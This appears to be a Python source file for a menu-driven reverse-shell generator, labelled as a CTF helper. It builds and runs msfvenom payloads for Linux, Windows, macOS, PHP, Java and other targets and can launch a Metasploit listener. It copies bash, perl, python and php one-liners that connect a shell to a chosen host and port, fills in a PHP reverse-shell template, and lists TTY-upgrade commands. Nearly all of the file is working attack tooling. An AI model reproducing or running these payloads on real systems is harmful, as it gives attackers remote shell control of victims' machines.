#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# title           :shellcode.py
# description     :Help generate shellcode for a ctf
# author          :
# date            :
# version         :0.1
# usage           :python shellcode.py lhost lport
# =======================================================================

# Import the modules needed to run the script.
import os
import query_yes_no
import pyperclip
import argparse
import show_ips
import sys
from colorama import init
from termcolor import colored
from pyfiglet import figlet_format

init(strip=not sys.stdout.isatty())

parser = argparse.ArgumentParser(description='Build shellcode for multiple platforms.')

parser.add_argument('host', help='Host to use for the shellcode', nargs='?', default="127.0.0.1", type=str)
parser.add_argument('port', help='Port to use for the shellcode', nargs='?', default=1234, type=int)
parser.add_argument('--php_filename', help='php filename to save as. (Default:php-reverse-shell.php)',
                    default='php-reverse-shell.php', type=str)
parser.add_argument('--msf_file_basename', help='msf basename to save as. (Default: shell)', default='shell', type=str)

args = parser.parse_args()


def info(text):
    return colored(text, "blue")


def error(text):
    return colored(text, "red")


def ask(text):
    return colored(text, "yellow")


def reminder(text):
    return colored(text, "green")


def option(text):
    return colored(text, "cyan")


def option2(text):
    return colored(text, "magenta")


def msf_generate(payload):
    shell_code = "msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s" % (
        payload['payload'], args.host, args.port, payload['format'], payload['filename'])
    terminal = 'msfconsole -qx "use exploit/multi/handler;set payload %s;set LHOST %s;set LPORT %s;exploit"' % (
        payload['payload'], args.host, args.port)
    print(info("Generating payload: " + shell_code))
    os.system(shell_code)
    if query_yes_no.query_yes_no(ask("Do you want to setup the listener?")):
        os.system(terminal)
    else:
        exit()


def php_file_pentestmonkey(payload=None):
    filename = args.php_filename
    dir = getcwd()
    fin = open(dir + "/php-reverse-shell-template.php")
    fout = open(filename, "wt")
    for line in fin:
        if '127.0.0.1' in line:
            fout.write(line.replace('127.0.0.1', str(args.host)))
        elif '1234' in line:
            fout.write(line.replace('1234', str(args.port)))
        else:
            fout.write(line)
    fin.close()
    fout.close()
    print(info("File created and updated as: " + filename))


# Other resources
# http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

# One liner shortcode
def oneliner(payload):
    print(info(payload['payload'] + " Copied to clipboard"))
    pyperclip.copy(payload['payload'])
    if 'tty' in payload and payload['tty'] is True:
        print(reminder("\nRemember:"))
        print(reminder("<ctrl+z> # to background"
                       "\nstty raw -echo"
                       "\nfg<enter>"
                       "\n<enter>"
                       "\n<enter>"
                       "\n# optional: export TERM=vt100"))
    exit()


payloads = [
    {
        'title': 'Reverse Shells',
        'generate_title': 'Select a payload to generate',
        'function': {'function_name': msf_generate},
        'submenu': [
            {
                "title": "",
                "payload": "linux/x86/meterpreter/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + ".elf"
            },
            {
                "title": "",
                "payload": "linux/x64/meterpreter/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + "_64.elf"
            },
            {
                "title": "",
                "payload": "linux/x86/shell/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + ".elf"
            },
            {
                "title": "",
                "payload": "linux/x64/shell/reverse_tcp",
                "format": "elf",
                "filename": args.msf_file_basename + "_64.elf"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_http",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_https",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_nonx_tcp",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/meterpreter/reverse_tcp",
                "format": "exe",
                "filename": args.msf_file_basename + ".exe"
            },
            {
                "title": "",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "format": "exe",
                "filename": args.msf_file_basename + "_64.exe"
            },
            {
                "title": "windows/x64/meterpreter/reverse_tcp (powershell format)",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "format": "psh",
                "filename": args.msf_file_basename + "_64.ps1"
            },
            {
                "title": "",
                "payload": "osx/x86/shell_reverse_tcp",
                "format": "macho",
                "filename": args.msf_file_basename + ".dmg"
            },
            {
                "title": "",
                "payload": "osx/x64/shell_reverse_tcp",
                "format": "macho",
                "filename": args.msf_file_basename + "_64.dmg"
            },
            {
                "title": "",
                "payload": "php/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".php"
            },
            {
                "title": "",
                "payload": "python/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".py"
            },
            {
                "title": "",
                "payload": "java/jsp_shell_reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".jsp"
            },
            {
                "title": "",
                "payload": "java/jsp_shell_reverse_tcp",
                "format": "war",
                "filename": args.msf_file_basename + ".war"
            },
            {
                "title": "",
                "payload": "java/meterpreter/reverse_tcp",
                "format": "raw",
                "filename": args.msf_file_basename + ".war"
            },
            {
                "title": "",
                "payload": "cmd/unix/reverse_bash",
                "format": "raw",
                "filename": args.msf_file_basename + ".sh"
            },
            {
                "title": "",
                "payload": "cmd/windows/powershell_reverse_tcp",
                "format": "ps1",
                "filename": args.msf_file_basename + ".ps1"
            },
            {
                'title': 'Bash Oneliner',
                'payload': 'bash -i >& /dev/tcp/{host}/{port} 0>&1'.format(host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'Perl Oneliner',
                'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (
                    args.host, args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'Python Oneliner',
                'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'PHP Oneliner',
                'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': 'PHP Oneliner V2',
                'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
                    host=args.host, port=args.port),
                'function': {'function_name': oneliner}
            },
            {
                'title': '',
                'payload': 'Generate PHP file pentest monkey',
                'function': {'function_name': php_file_pentestmonkey}
            },
        ]
    },
    {
        'title': 'TTY Code',
        'generate_title': 'Select a TTY to generate',
        'function': {'function_name': oneliner},
        'submenu': [
            {
                'title': '',
                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\'',
                'tty': True
            },
            {
                'title': '',
                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\'',
                'tty': True
            },
            {
                'title': '',
                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\'',
                'tty': True
            },
            {
                'title': '',
                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                'tty': True
            },
            {
                'title': '',
                'payload': 'echo os.system(\'/bin/bash\')',
                'tty': True
            },
            {
                'title': '',
                'payload': '/bin/sh -i',
                'tty': True
            },
            {
                'title': '',
                'payload': 'perl: exec "/bin/sh";',
                'tty': True
            },
        ]
    }
]


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


def getcwd():
    return os.path.dirname(os.path.realpath(__file__))


def main_menu(clear=True, items=None):
    if clear is True:
        cls()
    print(info("Working Directory is {dir}\n".format(dir=os.getcwd())))
    print(ask("Please select a menu option below:"))
    for index, value in enumerate(items):
        print(option(str(index) + ": " + value['title']))
    footer(items)


# Execute menu
def exec_menu(choice, item=None):
    cls()
    ch = choice.lower()
    if ch == '' or ch == "00" or ch == "99":
        if ch == '' or ch == "99":
            main_menu(clear=True, items=payloads)
        elif ch == "00":
            exit()
    else:
        try:
            if item is None:
                raise KeyError
            if 'submenu' in item:
                handle_payloads(item)
        except KeyError:
            print(error("Invalid selection, please try again.\n"))
            main_menu(clear=False, items=payloads)
    return


def footer_text():
    print(option2("\n99. Home"))
    print(option2("00. Quit"))


def footer(menu_items):
    footer_text()
    choice = input(ask(" >>  "))
    selected_item = None
    for index, value in enumerate(menu_items):
        if choice == str(index):
            selected_item = value
    exec_menu(choice, selected_item)
    return


def handle_payloads(item):
    print(ask(item['generate_title']))
    for index, value in enumerate(item['submenu']):
        if value['title'] != '':
            print(option(str(index) + ": " + value['title']))
        else:
            print(option(str(index) + ": " + value['payload']))
    footer_text()
    choice = input(ask(" >>  "))
    if choice == "00" or choice == "99":
        exec_menu(choice)
        return
    selected_payload = None
    for index, value in enumerate(item['submenu']):
        if choice == str(index):
            selected_payload = value
    try:
        if selected_payload is None:
            raise ValueError
        # try function on individual items
        if 'function' in selected_payload and selected_payload['function'] is not None \
                and selected_payload['function']['function_name'] is not None:
            selected_payload['function']['function_name'](selected_payload)
            return
        # try main function that is defined fallback to main function
        elif 'function' in item and item['function'] is not None and item['function']['function_name'] is not None:
            item['function']['function_name'](selected_payload)
            return
        return
    except ValueError:
        print(error("Something went wrong please try again."))
        handle_payloads(item)


# Main Program
if __name__ == "__main__":
    # Launch main menu
    cls()

    print(info(figlet_format("Sh3llc0de", font="standard")))
    print(ask("\nCreated By: jiveturkey and weirdatfirst"))
    show_ips.show_ips()
    main_menu(clear=False, items=payloads)
